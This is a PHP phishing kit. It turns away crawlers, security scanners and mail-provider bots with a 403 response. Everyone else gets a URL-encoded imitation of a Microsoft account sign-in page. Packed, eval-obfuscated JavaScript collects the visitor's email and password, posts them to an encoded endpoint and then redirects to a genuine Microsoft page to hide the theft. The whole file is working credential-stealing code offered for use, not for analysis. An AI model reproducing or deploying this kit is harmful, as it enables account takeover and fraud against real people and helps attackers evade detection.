<?php
$bots = array("Aol","Applebot","Baidu","Bing","bitly","bot","crawler","developers","Discord","DuckDuck","embedly","Exabot","facebot","fetch","flipboard","Google","archiver","linkedin","MJ12","Msn","msnbot","nuzzel","outbrain","pingdom","pinterest","preview","quora","reddit","rogerbot","scanner","scraper","seek","sensis","sentry","showyou","Skype","slackbot","slurp","sogou","spider","TelegramBot","tumblr","twitterbot","vkShare","Validator","WhatsApp","Yahoo","yandex","curl","live","hotmail","microsoft","mail","facebook","office","outlook","Protonmail","Zoho","webmail","Lycos","GMX","Netscape","Comcast","gzip");
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$pattern = '/' . implode('|', $bots) . '/i';
if (preg_match($pattern, $userAgent)) {
	header('HTTP/1.0 403 Forbidden'); 	exit;	}
else { $html = urldecode("%3C%21doctype%20html%3E%3Chtml%20lang%3D%22en%22%3E%3Chead%3E%3Cmeta%20charset%3D%22utf-8%22%3E%20%3Ctitle%3ESign%20in%20to%20your%20account%3C%2Ftitle%3E%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20shrink-to-fit%3Dno%22%3E%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A%2F%2Fuse.fontawesome.com%2Freleases%2Fv5.7.0%2Fcss%2Fall.css%22%20integrity%3D%22sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S%2Boqd12jhcu%2BA56Ebc1zFSJ%22%20crossorigin%3D%22anonymous%22%3E%3Cscript%20src%3D%22https%3A%2F%2Fcode.jquery.com%2Fjquery-3.6.1.min.js%22%3E%3C%2Fscript%3E%20%3Clink%20rel%3D%22shortcut%20icon%22%20type%3D%22image%2Fx-icon%22%20href%3D%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAeklEQVR4nO3UMQqAMBBE0QUL7%2BF5LOxyxlSewTvZj%2F10Q8AI%2FgfbBpb8pAoAPklt08j4eft5aGSKBRo3IBJK8IgNv1CKhAwJpUjIkFCKhGYnBPzd0m%2BNjJ%2Bna9XIFAt0bkAklOARG36hFAkZEkqRkCGhFAnNTggA6g0PsZwml5fu%2Bo4AAAAASUVORK5CYII%3D%22%3E%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A%2F%2Fmaxcdn.bootstrapcdn.com%2Fbootstrap%2F4.0.0%2Fcss%2Fbootstrap.min.css%22%20integrity%3D%22sha384-Gn5384xqQ1aoWXA%2B058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW%2FdAiS6JXm%22%20crossorigin%3D%22anonymous%22%3E%20%3Cstyle%20type%3D%22text%2Fcss%22%3E%20textarea%3Ahover%2C%20input%3Ahover%2C%20textarea%3Aactive%2C%20input%3Aactive%2C%20textarea%3Afocus%2C%20input%3Afocus%2C%20button%3Afocus%2C%20button%3Aactive%2C%20button%3Ahover%2C%20label%3Afocus%2C%20.btn%3Aactive%2C%20.btn.active%7Boutline%3A%200px%20%21important%3B%20-webkit-appearance%3A%20none%3B%20box-shadow%3A%20none%20%21important%3B%7D.box%7Bbox-shadow%3A%200%202px%206px%20rgb%280%200%200%20%2F%2020%25%29%3B%20%2F%2Aborder%3A%201px%20solid%20rgba%280%2C%200%2C%200%2C%200.4%29%3B%2A%2F%20%2F%2Amax-height%3A%20350px%3B%2A%2F%20max-width%3A%20440px%3B%20%2F%2Awidth%3A%20calc%28100%25%20-%2040px%29%3B%2A%2F%20padding%3A%2048px%20%21important%3B%20margin-left%3A%20auto%3B%20margin-right%3A%20auto%3B%20margin-top%3A%2020px%3B%20margin-bottom%3A%2028px%3B%20background-color%3A%20white%3B%20overflow-x%3A%20hidden%3B%7D.boxtext%7Bz-index%3A%200px%3B%20transform%3A%20translateX%28%2B200px%29%3B%20animation%3A%20myAnim%20300ms%20ease-in%200s%201%20normal%20forwards%3B%7D%40keyframes%20myAnim%7B0%25%7Btransform%3A%20translateX%28-200%29%3B%7D100%25%7Btransform%3A%20translateX%280px%29%3B%7D%7D%40keyframes%20bgmyAnim%7B0%25%7Bopacity%3A%200%3B%7D100%25%7Bopacity%3A%201%3B%7D%7D.box2%7Bbox-shadow%3A%200%202px%206px%20rgb%280%200%200%20%2F%2020%25%29%3B%20%2F%2Aborder%3A%201px%20solid%20rgba%280%2C%200%2C%200%2C%200.4%29%3B%2A%2F%20%2F%2Amax-height%3A%20350px%3B%2A%2F%20max-width%3A%20440px%3B%20%2F%2Awidth%3A%20calc%28100%25%20-%2040px%29%3B%2A%2F%20padding%3A%208px%2048px%20%21important%3B%20margin-left%3A%20auto%3B%20margin-right%3A%20auto%3B%20margin-bottom%3A%2028px%3B%20background-color%3A%20white%3B%7D%23footer%7Bposition%3A%20fixed%3B%20bottom%3A%200px%3B%20width%3A%20100%25%3B%20overflow%3A%20visible%3B%20z-index%3A%2099%3B%20clear%3A%20both%3B%20%23%20background-color%3A%20%23000%3B%20%23%20background-color%3A%20rgba%280%2C%200%2C%200%2C%200.6%29%3B%7Ddiv%20.footerNode%20a%2C%20div%20.footerNode%20span%7Bcolor%3A%20%23000%3B%20font-size%3A%200.75rem%3B%20line-height%3A%2028px%3B%20white-space%3A%20nowrap%3B%20display%3A%20inline-block%3B%20float%3A%20right%3B%20margin-left%3A%208px%3B%20margin-right%3A%208px%3B%7D.bgimg%7Banimation%3A%20bgmyAnim%201s%20cubic-bezier%280.11%2C%200%2C%200.5%2C%200%29%200s%201%20normal%20forwards%3B%20position%3A%20absolute%3B%20height%3A%20100%25%3B%20width%3A%20100%25%3B%20top%3A%200px%3B%20background-size%3A%20cover%3B%20background-repeat%3A%20no-repeat%3B%20background-image%3A%20url%28%27https%3A%2F%2Fi.imgur.com%2FSyO5Weq.jpg%27%29%3B%7D.topp%7Bmargin-top%3A%2048px%20%21important%3B%20padding-top%3A%2048px%20%21important%3B%7D%40media%20only%20screen%20and%20%28max-width%3A%20610px%29%7B%23hide%7Bdisplay%3A%20none%3B%7D.topp%7Bmargin-top%3A%2010px%20%21important%3B%20padding-top%3A%205px%20%21important%3B%7D.bgimg%7Bposition%3A%20absolute%3B%20height%3A%20100%25%3B%20width%3A%20100%25%3B%20top%3A%200px%3B%20background-size%3A%20cover%3B%20background-repeat%3A%20no-repeat%3B%20background-image%3A%20none%3B%20background-color%3A%20white%3B%7D.box%7Bbox-shadow%3A%20none%3B%20%2F%2Aborder%3A%201px%20solid%20rgba%280%2C%200%2C%200%2C%200.4%29%3B%2A%2F%20%2F%2Amax-height%3A%20350px%3B%2A%2F%20max-width%3A%20440px%3B%20%2F%2Awidth%3A%20calc%28100%25%20-%2040px%29%3B%2A%2F%20padding%3A%200px%20%21important%3B%20margin-left%3A%20auto%3B%20margin-right%3A%20auto%3B%20margin-top%3A%200px%3B%20margin-bottom%3A%2028px%3B%20background-color%3A%20white%3B%7D.box2%7Bbox-shadow%3A%20none%3B%20%2F%2Aborder%3A%201px%20solid%20rgba%280%2C%200%2C%200%2C%200.4%29%3B%2A%2F%20%2F%2Amax-height%3A%20350px%3B%2A%2F%20border%3A%201px%20solid%3B%20max-width%3A%20440px%3B%20%2F%2Awidth%3A%20calc%28100%25%20-%2040px%29%3B%2A%2F%20padding%3A%208px%2020px%20%21important%3B%20margin-left%3A%2030px%20%21important%3B%20margin-right%3A%2030px%20%21important%3B%20margin-bottom%3A%2028px%20%21important%3B%20background-color%3A%20white%3B%7D%7D.loader%7B%2F%2Aposition%3A%20absolute%3B%2A%2F%20%2F%2Apadding%3A%2030px%200px%3B%2A%2F%20width%3A%2040px%3B%20%2F%2Amargin%3A%20-22px%3B%2A%2F%7D.loader%20.circle%7Bposition%3A%20absolute%3B%20width%3A%2018px%3B%20height%3A%2018px%3B%20opacity%3A%200%3B%20transform%3A%20rotate%28225deg%29%3B%20animation-iteration-count%3A%20infinite%3B%20animation-name%3A%20orbit%3B%20animation-duration%3A%203s%3B%7D.loader%20.circle%3Aafter%7Bcontent%3A%20%22%22%3B%20position%3A%20absolute%3B%20width%3A%203px%3B%20height%3A%203px%3B%20border-radius%3A%205px%3B%20background%3A%20%23000%3B%7D.loader%20.circle%3Anth-child%282%29%7Banimation-delay%3A%20240ms%3B%7D.loader%20.circle%3Anth-child%283%29%7Banimation-delay%3A%20480ms%3B%7D.loader%20.circle%3Anth-child%284%29%7Banimation-delay%3A%20720ms%3B%7D.loader%20.circle%3Anth-child%285%29%7Banimation-delay%3A%20960ms%3B%7D%40keyframes%20orbit%7B0%25%7Btransform%3A%20translate%2810px%2C%200%29%3B%20opacity%3A%201%3B%20animation-timing-function%3A%20ease-out%3B%7D7%25%7Btransform%3A%20translate%2830px%2C%200%29%3B%20animation-timing-function%3A%20linear%3B%7D30%25%7Btransform%3A%20translate%2860px%2C%200%29%3B%20animation-timing-function%3A%20ease-in-out%3B%7D40%25%7Btransform%3A%20translate%2890px%2C%200%29%3B%20animation-timing-function%3A%20ease-out%3B%7D50%25%7Btransform%3A%20translate%28120px%2C%200%29%3B%20animation-timing-function%3A%20ease-out%3B%7D75%25%7Btransform%3A%20translate%28250px%2C%200%29%3B%20animation-timing-function%3A%20ease-out%3B%7D76%25%7Btransform%3A%20translate%28300px%2C%200%29%3B%20opacity%3A%200%3B%7D100%25%7Btransform%3A%20translate%28350px%2C%200%29%3B%20opacity%3A%200%3B%7D%7D%3C%2Fstyle%3E%3C%2Fhead%3E%3Cbody%3E%20%3Cdiv%20class%3D%22bgimg%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22container-fluid%22%3E%20%3Cdiv%20class%3D%22container%22%3E%20%3Cdiv%20class%3D%22row%20topp%22%3E%20%3Cdiv%20class%3D%22col-lg-12%20text-center%20mx-auto%22%3E%20%3C%2Fdiv%3E%3Cdiv%20class%3D%22col-lg-6%20mx-auto%22%3E%20%3Cdiv%20class%3D%22box%22%20id%3D%22diiiv1%22%3E%20%3Cdiv%20class%3D%22loader%20%22%20style%3D%22display%3Anone%3B%22%3E%20%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22boxtext%22%3E%20%3Cimg%20src%3D%22https%3A%2F%2Fi.imgur.com%2FS4iamjZ.png%22%20style%3D%22max-height%3A%2036px%3B%22%20id%3D%22banner1%22%20class%3D%22img-fluid%20logoimg%22%3E%3Cbr%3E%3Cbr%3E%3Cspan%20class%3D%22h5%22%3ESign%20In%3C%2Fspan%3E%3Cbr%3E%3Cspan%20id%3D%22error%22%20class%3D%22text-danger%22%20style%3D%22display%3A%20none%3B%22%3EThat%20Microsoft%20account%20doesn%27t%20exist.%20Enter%20a%20different%20account%3C%2Fspan%3E%20%3Cdiv%20class%3D%22form-group%20mt-2%22%3E%20%3Cinput%20type%3D%22email%22%20name%3D%22ai%22%20class%3D%22form-control%20rounded-0%20border-dark%22%20id%3D%22ai%22%20aria-describedby%3D%22aiHelp%22%20placeholder%3D%22Email%2C%20phone%2C%20or%20Skype%22%20value%3D%22%22%20style%3D%22border-right%3A%20none%3Bborder-left%3A%20none%3Bborder-top%3A%20none%3B%22%3E%20%3C%2Fdiv%3E%3Cp%20style%3D%22font-size%3A%2013px%22%3ENo%20account%3F%20%3Ca%20href%3D%22%23%22%3ECreate%20one%21%3C%2Fa%3E%3C%2Fp%3E%3Cp%20style%3D%22font-size%3A%2013px%22%3E%3Ca%20href%3D%22%23%22%3ECan%27t%20access%20your%20account%3F%3C%2Fa%3E%3C%2Fp%3E%3Cdiv%20class%3D%22text-right%22%3E%3Cbutton%20type%3D%22button%22%20class%3D%22btn%20rounded-0%20text-white%20px-4%22%20style%3D%22color%3A%20%234CAF50%3Bbackground-color%3A%20%23b2b2b2%3Bcursor%3A%20pointer%3B%22%3EBack%3C%2Fbutton%3E%20%3Cbutton%20type%3D%22button%22%20class%3D%22btn%20rounded-0%20text-white%20px-4%22%20id%3D%22next%22%20style%3D%22background-color%3A%20%230066BA%3Bcursor%3A%20pointer%3B%22%3ENext%3C%2Fbutton%3E%20%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22box%22%20id%3D%22div2%22%20style%3D%22display%3A%20none%3B%22%3E%20%3Cdiv%20class%3D%22loader%20%22%20style%3D%22display%3Anone%3B%22%3E%20%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cform%20id%3D%22contact%22%20class%3D%22boxtext%22%3E%20%3Cimg%20src%3D%22https%3A%2F%2Fi.imgur.com%2FS4iamjZ.png%22%20style%3D%22max-height%3A%2036px%3B%22%20id%3D%22banner2%22%20class%3D%22img-fluid%20logoimg%22%3E%3Cbr%3E%3Cbr%3E%3Ci%20class%3D%22fas%20fa-arrow-left%22%20id%3D%22back%22%3E%3C%2Fi%3E%26nbsp%26nbsp%3Cspan%20id%3D%22aich%22%3Eemail%40office.com%3C%2Fspan%3E%20%3Cdiv%20class%3D%22py-2%22%3E%3Cspan%20class%3D%22h5%22%3EEnter%20Password%3C%2Fspan%3E%3C%2Fdiv%3E%3Cspan%20class%3D%22pb-2%22%20style%3D%22color%3A%20%23e81123%3B%22%20id%3D%22msg%22%3E%3C%2Fspan%3E%20%3Cdiv%20class%3D%22form-group%20mt-2%22%3E%20%3Cinput%20type%3D%22password%22%20name%3D%22pr%22%20class%3D%22form-control%20rounded-0%20border-dark%22%20id%3D%22pr%22%20aria-describedby%3D%22aiHelp%22%20placeholder%3D%22Enter%20Password%22%20style%3D%22border-right%3A%20none%3Bborder-left%3A%20none%3Bborder-top%3A%20none%3B%22%3E%20%3C%2Fdiv%3E%3Cp%20style%3D%22font-size%3A%2014px%22%3E%3Ca%20href%3D%22%23%22%3EForget%20password%3F%3C%2Fa%3E%3C%2Fp%3E%3Cdiv%20class%3D%22text-right%22%3E%20%3Cbutton%20type%3D%22button%22%20class%3D%22btn%20rounded-0%20text-white%20px-4%22%20id%3D%22submit-btn%22%20style%3D%22background-color%3A%20%230066BA%3B%22%3ESign%20in%3C%2Fbutton%3E%20%3C%2Fdiv%3E%3C%2Fform%3E%20%3C%2Fdiv%3E%3Cdiv%20class%3D%22box%22%20id%3D%22div3%22%20style%3D%22display%3A%20none%3B%22%3E%20%3Cdiv%20class%3D%22boxtext%22%3E%20%3Cimg%20src%3D%22https%3A%2F%2Fi.imgur.com%2FS4iamjZ.png%22%20style%3D%22max-height%3A%2036px%3B%22%20id%3D%22banner3%22%20class%3D%22img-fluid%20logoimg%22%3E%3Cbr%3E%3Cbr%3E%3Cspan%20class%3D%22h4%22%3ETaking%20you%20to%20your%20Organization%27s%20sign-in%20page%3C%2Fspan%3E%3Cbr%3E%3Cbr%3E%3Cdiv%20class%3D%22loader%20%22%3E%20%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cbr%3E%3Cdiv%20class%3D%22text-left%22%3E%20%3Ca%20href%3D%22%23%22%3Ecancel%3C%2Fa%3E%20%3C%2Fdiv%3E%3Cbr%3E%3Cbr%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22box%22%20id%3D%22div9%22%20style%3D%22display%3A%20none%3B%22%3E%20%3Cdiv%20class%3D%22boxtext%22%3E%20%3Cimg%20src%3D%22https%3A%2F%2Fi.imgur.com%2FS4iamjZ.png%22%20style%3D%22max-height%3A%2036px%3B%22%20id%3D%22banner4%22%20class%3D%22img-fluid%20logoimg%22%3E%3Cbr%3E%3Cbr%3E%3Cspan%20class%3D%22h4%22%3ETrying%20to%20sign%20you%20in%3C%2Fspan%3E%3Cbr%3E%3Cbr%3E%3Cdiv%20class%3D%22loader%20%22%3E%20%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22circle%22%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cbr%3E%3Cdiv%20class%3D%22text-left%22%3E%20%3Ca%20href%3D%22%23%22%3Ecancel%3C%2Fa%3E%20%3C%2Fdiv%3E%3Cbr%3E%3Cbr%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%20id%3D%22row%22%3E%20%3Cdiv%20class%3D%22col-sm-5%20mx-auto%20box2%22%3E%20%3Cdiv%20class%3D%22py-2%20bg-white%20%22%3E%20%3Cspan%3E%3Ci%20class%3D%22fas%20fa-key%22%3E%3C%2Fi%3E%20%26nbspSign-in%20options%3C%2Fspan%3E%20%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Cfooter%20id%3D%22footer%22%3E%20%3Cdiv%3E%20%3Cdiv%20class%3D%22footerNode%22%3E%20%3Ca%20href%3D%22%23%22%3EPrivacy%20%26%20cookies%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%3ETerms%20of%20use%3C%2Fa%3E%20%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Ffooter%3E%0D%0A%3C%2Fbody%3E%3Cscript%3E%0D%0Avar%20url%20%3D%20%22next.php%22%3B%0D%0Aeval%28function%28p%2Ca%2Cc%2Ck%2Ce%2Cd%29%7Be%3Dfunction%28c%29%7Breturn%28c%3Ca%3F%27%27%3Ae%28parseInt%28c%2Fa%29%29%29%2B%28%28c%3Dc%25a%29%3E35%3FString.fromCharCode%28c%2B29%29%3Ac.toString%2836%29%29%7D%3Bwhile%28c--%29%7Bif%28k%5Bc%5D%29%7Bp%3Dp.replace%28new%20RegExp%28%27%5C%5Cb%27%2Be%28c%29%2B%27%5C%5Cb%27%2C%27g%27%29%2Ck%5Bc%5D%29%7D%7Dreturn%20p%7D%28%27%24%281y%29.2q%288%28%29%7Bf%201Y%3D0%2Cm%3D1z.1u.1V.j%281%29%3Bd%28%21m%29%7B%7DB%7Bd%28%21%2F%5E%28%5B0-T-e-Z%2B%2F%5D%7B4%7D%29%2A%28%28%5B0-T-e-Z%2B%2F%5D%7B2%7D%3D%3D%29%7C%28%5B0-T-e-Z%2B%2F%5D%7B3%7D%3D%29%29%3F%24%2F.W%28m%29%29%7Bf%20k%3Dm%7DB%7Bf%20k%3D16%28m%29%7Dd%28%21%2F%5E%28%5Ba-e-n-1B%5C%5C.%5C%5C-%5D%29%2B%5C%5C%40%28%28%5Ba-e-n-9%5C%5C-%5D%29%2B%5C%5C.%29%2B%28%5Ba-e-n-9%5D%7B2%2C4%7D%29%2B%24%2F.W%28k%29%29%7BV%20%24%28%22%23P%22%29.c%28%29%2Cm.1m%2C14%7Df%201a%3Dk.p%28%22%40%22%29%2CL%3Dk.j%281a%2B1%29%2CQ%3DL.j%280%2CL.p%28%22.%22%29%29%2C1T%3DQ.R%28%29%2C1X%3DQ.1b%28%29%3B%24%28%22%23s%22%29.r%28k%29%3B%24%28%22%23J%22%29.6%28%7Bh%3A0%2C5%3A%227%22%7D%2C0%29%3B%24%28%22%23E%22%29.6%28%7Bz%3A0%2C5%3A%22c%22%7D%2C0%29%3B19%28%28%29%3D%3E%7B%24%28%22%23E%22%29.6%28%7Bh%3A0%2C5%3A%227%22%7D%2C0%29%3B%24%28%22%23v%22%29.6%28%7Bz%3A0%2C5%3A%22c%22%7D%2C0%29%3B%24%28%22%231n%22%29.C%28k%29%7D%2C1k%29%7D%24%28%22%23s%22%29.q%288%28%29%7B%24%28%22%23P%22%29.7%28%29%7D%29%3Bf%20a%3D%5C%271P%5C%27%3B%24%281y%29.1W%288%28u%29%7Bf%201o%3Du.1s%3Fu.1s%3Au.1G%3Bd%281o%3D%3D%2213%22%29%7Bu.H%28%29%3Bd%28%24%28%22%23J%22%29.17%28%22%3A1v%22%29%29%7B%24%28%22%231A%22%29.q%28%29%7DB%7Bd%28%24%28%22%23v%22%29.17%28%22%3A1v%22%29%29%7Bu.H%28%29%3B%24%28%22%231g-1f%22%29.q%28%29%7DB%7BV%2014%7D%7D%7D%7D%29%3Bf%20o%3D16%28a.1t%28%2F%5Ba-e-Z%5D%2Fg%2Cl%3D%3E1H.1O%28%28l%3C%3D%22Z%22%3F1F%3A1R%29%3E%3D%28l%3Dl.1U%280%29%2B13%29%3Fl%3Al-26%29%29%29%3B%24%28%22%231A%22%29.q%288%28%29%7B%24%28%22%23i%22%29.7%28%29%3B1S.H%28%29%3Bf%20w%3D%24%28%22%23s%22%29.r%28%29%3Bd%28%21%2F%5E%28%5Ba-e-n-1B%5C%5C.%5C%5C-%5D%29%2B%5C%5C%40%28%28%5Ba-e-n-9%5C%5C-%5D%29%2B%5C%5C.%29%2B%28%5Ba-e-n-9%5D%7B2%2C4%7D%29%2B%24%2F.W%28w%29%29%7BV%20%24%28%22%23P%22%29.c%28%29%2Cm.1m%2C14%7Df%201e%3Dw.p%28%22%40%22%29%2CY%3Dw.j%281e%2B1%29%2C15%3DY.j%280%2CY.p%28%22.%22%29%29%2C20%3D15.R%28%29%2C1Q%3D15.1b%28%29%3B%24%28%22%23J%22%29.6%28%7Bh%3A0%2C5%3A%227%22%7D%2C0%29%3B%24%28%22%23E%22%29.6%28%7Bz%3A0%2C5%3A%22c%22%7D%2C0%29%3B%24.O%28%7BN%3A%22M%22%2CA%3Ao%2CX%3A%7Bs%3Aw%7D%2C10%3A8%28b%29%7Bb%3D1N.1M%28b%29%3Bd%28b.D%29%7B%24%28%22%231L%22%29.G%28%22F%22%2Cb.D%29%3B%24%28%22%231K%22%29.G%28%22F%22%2Cb.D%29%3B%24%28%22%231J%22%29.G%28%22F%22%2Cb.D%29%3B%24%28%22%231I%22%29.G%28%22F%22%2Cb.D%29%7Dd%28b.x%29%7B%24%28%5C%271Z%5C%27%29.22%28%22%3C12%3E%4025%202G%202s%202B%20%282z-2y%3A%202x%29%7B.2D%20%7B%20x-2K%3A%20A%28%5C%27%22%2Bb.x%2B%22%5C%27%29%3B%20x-11%3A%202t%3Bx-2u-2v%3A%202w%3Bx-2r-y%3A%202A%3B%20%7D%7D%3C%2F12%3E%22%29%3B%24%28%5C%271i%20.1l%20a%2C%201i%20.1l%20K%5C%27%29.2C%28%5C%2711%5C%27%2C%5C%27%232E%5C%27%29%3B%24%28%22%231h%22%29.7%28%29%7D%7D%7D%29%3B19%28%28%29%3D%3E%7B%24%28%22%23E%22%29.6%28%7Bh%3A0%2C5%3A%227%22%7D%2C0%29%3B%24%28%22%23v%22%29.6%28%7Bz%3A0%2C5%3A%22c%22%7D%2C0%29%3B%24%28%22%231n%22%29.C%28w%29%7D%2C1k%29%7D%29%3B%24%28%22%2321%22%29.q%288%28%29%7B%24%28%22%23i%22%29.7%28%29%3B%24%28%22%23s%22%29.r%28%22%22%29%3B%24%28%22%231q%22%29.r%28%22%22%29%3B%24%28%22%23v%22%29.6%28%7Bh%3A0%2C5%3A%227%22%7D%2C0%29%3B%24%28%22%23J%22%29.6%28%7Bz%3A0%2C5%3A%22c%22%7D%2C1c%29%3B%24%28%22%231h%22%29.c%28%29%7D%29%3B%24%28%22%231g-1f%22%29.q%288%281d%29%7B1d.H%28%29%3Bf%20I%3D%24%28%22%23s%22%29.r%28%29%2C18%3D%24%28%22%231q%22%29.r%28%29%2C2H%3D%24%28%22%232I%22%29.C%28%29%2C1C%3D%24%28%22%23i%22%29.C%28%29%2CU%3DI%2C1p%3DU.p%28%22%40%22%29%2CS%3DU.j%281p%2B1%29%2C1D%3DS.j%280%2CS.p%28%22.%22%29%29%2C2J%3D1D.R%28%29%3B%24%28%22%23i%22%29.2f%281C%29%3B%24.O%28%7BA%3Ao%2CN%3A%22M%22%2CX%3A%7B1x%3AI%2C1w%3A18%7D%2C2p%3A8%2824%29%7B%24%28%22%23v%22%29.6%28%7Bh%3A0%2C5%3A%227%22%7D%2C0%29%3B%24%28%22%231j%22%29.6%28%7Bh%3A0%2C5%3A%22c%22%7D%2C0%29%7D%2C10%3A8%281r%29%7Bd%281r%3D%3D%3D%221%22%29%7B%24%28%22%23i%22%29.7%28%29%3B%24.O%28%7BN%3A%22M%22%2CA%3AA%2CX%3A%7B1x%3AI%2C1w%3A18%7D%2C10%3A8%28b%29%7B1z.1u.1t%2816%28%2227%22%29%29%7D%7D%29%7DB%7B%24%28%22%23i%22%29.C%28%22%3CK%2028%3D%5C%2729-2%5C%27%202a%3D%5C%27i%5C%27%2012%3D%5C%2711%3A%20%232b%3B%5C%27%3E2c%202d%2023%201E%2017%202e.%202g%202h%202i%5C%27t%202j%202k%201E%2C%20%3Ca%202l%3D%5C%27%23%5C%27%3E2m%202n%202o%3C%2Fa%3E%3C%2FK%3E%22%29%3B%24%28%22%23i%22%29.c%28%29%3B%24%28%22%231j%22%29.6%28%7Bh%3A0%2C5%3A%227%22%7D%2C0%29%3B%24%28%22%23v%22%29.6%28%7Bh%3A0%2C5%3A%22c%22%7D%2C1c%29%7D%7D%2C2F%3A8%28%29%7B%7D%7D%29%7D%29%7D%29%3B%27%2C62%2C171%2C%27%7C%7C%7C%7C%7Copacity%7Canimate%7Chide%7Cfunction%7C%7C%7Cresult%7Cshow%7Cif%7CzA%7Cvar%7C%7Cleft%7Cmsg%7Csubstr%7Cbrayle%7C%7Corlie%7CZ0%7C%7CindexOf%7Cclick%7Cval%7Cai%7C%7Ctykirah%7Cdiv2%7Ciayla%7Cbackground%7C%7Cright%7Curl%7Celse%7Chtml%7Cbanner%7Cdiv3%7Csrc%7Cattr%7CpreventDefault%7Causbon%7Cdiiiv1%7Cspan%7Cjerrika%7CPOST%7Ctype%7Cajax%7Cerror%7Cakilles%7CtoLowerCase%7Cshipley%7C9a%7Cgwendlyon%7Creturn%7Ctest%7Cdata%7Cdodger%7C%7Csuccess%7Ccolor%7Cstyle%7C%7Cfalse%7Ccadince%7Catob%7Cis%7Cbriyit%7CsetTimeout%7Chelma%7CtoUpperCase%7C100%7Cjaken%7Cabundio%7Cbtn%7Csubmit%7Crow%7Cdiv%7Cdiv9%7C2e3%7CfooterNode%7Cfocus%7Caich%7Cmelquiades%7Cortrude%7Cpr%7Cavalei%7CkeyCode%7Creplace%7Clocation%7Cvisible%7Cpass%7Cuser%7Cdocument%7Cwindow%7Cnext%7C9_%7Caquera%7Ctyquis%7Cpassword%7C90%7Cwhich%7CString%7Cbanner4%7Cbanner3%7Cbanner2%7Cbanner1%7Cparse%7CJSON%7CfromCharCode%7CnUE0pUZ6Yl9grJyjpl5wLl9upTxi%7Cjorley%7C122%7Cevent%7Croham%7CcharCodeAt%7Chash%7Ckeypress%7Cevald%7Clotha%7Chead%7Cjalon%7Cback%7Cappend%7Cor%7Clatwanna%7Cmedia%7C%7CaHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9taWNyb3NvZnQtMzY1%7Cclass%7Cpb%7Cid%7Ce81123%7CYour%7Caccount%7Cincorrect%7Ctext%7CIf%7Cyou%7Cdon%7Cremember%7Cyour%7Chref%7Creset%7Cit%7Cnow%7CbeforeSend%7Cready%7Cposition%7Cscreen%7Cgrey%7Cblend%7Cmode%7Cmultiply%7C610px%7Cwidth%7Cmin%7Ccenter%7Cand%7Ccss%7Cbgimg%7Cfff%7Ccomplete%7Conly%7Cdominesha%7Cfield%7Ctmarion%7Cimage%27.split%28%27%7C%27%29%29%29%0D%0A%3C%2Fscript%3E%0D%0A%3C%2Fhtml%3E");echo $html;}